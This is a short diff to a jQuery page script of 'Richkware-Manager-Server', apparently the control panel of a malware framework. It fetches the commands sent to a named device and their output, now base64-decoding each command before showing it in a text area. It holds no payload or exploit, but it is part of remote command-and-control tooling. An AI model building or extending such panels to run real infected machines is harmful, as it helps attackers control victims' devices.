@@ -8,7 +8,7 @@ $(document).ready(function () {
         window.location.replace("/Richkware-Manager-Server/devices.html")
     })
 
-    $.get("command", {data0: deviceName, data1: "client"}, function (response) {
+    $.get("command", {data0: deviceName, channel: "webapp"}, function (response) {
         var JSONdata = JSON.parse(response)
         if (JSONdata.statusCode == 1000) {
             var output = JSONdata.message
@@ -19,7 +19,7 @@ $(document).ready(function () {
             var previous = ""
             for (var i = 0; i < commands.length; ++i) {
                 previous = $("#text-area").val()
-                $('#text-area').val(previous + "\n" + commands[i])
+                $('#text-area').val(previous + "\n" + atob(commands[i]))
             }
         } else {
             alert("Error, retrieving reverse commands output: " + response)
